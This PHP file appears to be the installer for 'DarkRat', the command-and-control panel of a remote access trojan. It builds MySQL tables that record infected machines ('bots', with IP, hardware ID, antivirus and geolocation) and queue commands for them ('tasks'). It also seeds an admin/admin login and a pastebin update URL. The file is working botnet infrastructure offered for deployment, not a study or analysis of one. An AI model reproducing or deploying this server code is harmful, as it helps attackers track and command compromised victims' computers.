<?php

class Install{



    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

     public function index()
    {

        if(!empty($_POST)){
            $mysqldatabaseRand = $this->generateRandomString(2);
            $mysqlpassword = $this->generateRandomString(20);
               
                if(empty($_POST["mysqlusername"]) || empty($_POST["mysqlpassword"])){
                        die("Error Wrong Details");
                }


                try{
                    $databaseCon = new PDO('mysql:host=localhost', $_POST["mysqlusername"], $_POST["mysqlpassword"]);
                }catch(PDOException $e){
                    die($e->getmessage());
                }
    
   
               $database = "
                    SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
                    SET time_zone = '+00:00';
                    CREATE USER '".$mysqldatabaseRand."'@'localhost' IDENTIFIED BY  '".$mysqlpassword."';
                    GRANT USAGE ON *.* TO '".$mysqldatabaseRand."'@'localhost' REQUIRE NONE WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;
                    CREATE DATABASE IF NOT EXISTS `".$mysqldatabaseRand."`;GRANT ALL PRIVILEGES ON `".$mysqldatabaseRand."`.* TO '".$mysqldatabaseRand."'@'localhost';
                    USE ".$mysqldatabaseRand.";
                    
                     CREATE TABLE `config` (
                      `id` int(11) NOT NULL,
                      `enryptionkey` varchar(255) DEFAULT NULL,
                      `check_update_url` varchar(255) DEFAULT NULL,
                      `useragent` varchar(255) DEFAULT NULL
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                            
        INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`) VALUES
        (1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret');

                   ALTER TABLE `config`
                   ADD PRIMARY KEY (`id`);
                   ALTER TABLE `config`
                   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
   

                    CREATE TABLE `securitytokens` (
                      `id` int(10) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY,
                      `user_id` int(10) NOT NULL,
                      `identifier` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
                      `securitytoken` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
                      `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
                    
                    CREATE TABLE `bots` (
                  `id` int(11) NOT NULL,
                  `antivirus` varchar(255) DEFAULT NULL,
                  `hwid` varchar(255) DEFAULT NULL,
                  `computrername` varchar(100) DEFAULT NULL,
                  `country` varchar(25) DEFAULT NULL,
                  `netframework2` varchar(11) NOT NULL DEFAULT 'false',
                  `netframework3` varchar(11) NOT NULL DEFAULT 'false',
                  `netframework35` varchar(11) NOT NULL DEFAULT 'false',
                  `netframework4` varchar(11) NOT NULL DEFAULT 'false',
                  `latitude` varchar(255) DEFAULT NULL,
                  `longitude` varchar(255) DEFAULT NULL,
                  `countryName` varchar(255) DEFAULT NULL,
                  `ip` varchar(30) DEFAULT NULL,
                  `lastresponse` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
                  `operingsystem` varchar(255) DEFAULT NULL,
                  `install_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
                  `version` varchar(10) NOT NULL DEFAULT '0.0'
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

   
   
                   CREATE TABLE `tasks` (
                   `id` int(11) NOT NULL,
                   `filter` varchar(100) NOT NULL,
                   `status` varchar(100) NOT NULL,
                   `task` varchar(255) NOT NULL DEFAULT '0',
                   `command` varchar(255) DEFAULT NULL,
                   `executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
                   ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
   
                 
   
                   CREATE TABLE `tasks_completed` (
                   `id` int(11) NOT NULL,
                   `bothwid` varchar(100) NOT NULL,
                   `taskid` varchar(100) NOT NULL,
                   `status` varchar(100) DEFAULT NULL
                   ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
   
   
                   CREATE TABLE `users` (
                   `id` int(10) UNSIGNED NOT NULL,
                   `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
                   `passwort` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
                   `active` int(1) NOT NULL DEFAULT '1',
                   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
                   `updated_at` timestamp NULL DEFAULT NULL
                   ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
   
                   ALTER TABLE `bots`
                   ADD PRIMARY KEY (`id`);
   
                   ALTER TABLE `tasks`
                   ADD PRIMARY KEY (`id`);
   
                
                   ALTER TABLE `tasks_completed`
                   ADD PRIMARY KEY (`id`);
   
           
                   ALTER TABLE `users`
                   ADD PRIMARY KEY (`id`),
                   ADD UNIQUE KEY `username` (`username`);
   
           
                   ALTER TABLE `bots`
                   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
          
                   ALTER TABLE `tasks`
                   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
                   ALTER TABLE `tasks_completed`
                   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
       
                   ALTER TABLE `users`
                   MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
                
                   
                   INSERT INTO users SET username = 'admin', passwort = '".str_replace("%","$",'%2y%10%e031/Nzd4x5LWstBinp7puC2Wil1bRIqm6e/c0eKfD/tLZVwlupyG')."'
               ";

                try{
                    $statement = $databaseCon->prepare($database);
                    $statement->execute(array()); 
                }catch(PDOException $e){
                    die($e->getmessage());
                }
                $string = "<?php %pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqldatabaseRand."', '".$mysqlpassword."');";
                file_put_contents(__DIR__."/../../../../../config.php",str_replace("%","$",$string));

 

                echo "
                DarkRat is Installed<br>
                Please Change Default Login in the Admin Center
                <hr>
                Username: admin<br>
                Password: admin<br>
                    <br>
                <a href='/login'>Click Me to Login</a>
                ";
                die();
        }

       
            $return = array(
                "mysql" => false,
                "writable" => array(),
                "dontwritable" => array(),
            );

            if(in_array("mysql",PDO::getAvailableDrivers())){
                $return["mysql"] = true;
            }
            $newFileName = __DIR__.'/../../../../../file.txt';
            $dirs = array_filter(glob('*'), 'is_dir');
            if (  is_writable(dirname($newFileName))) {
                $return["writable"][] = "Root Dir";
            }
            foreach ($dirs as $dir) {
                if (is_writable($dir)) {
                    $return["writable"][] = $dir;
                } else {
                    $return["dontwritable"][] = $dir;
                }
            }


            $GLOBALS["tpl"]->assign("return",$return);

    }
}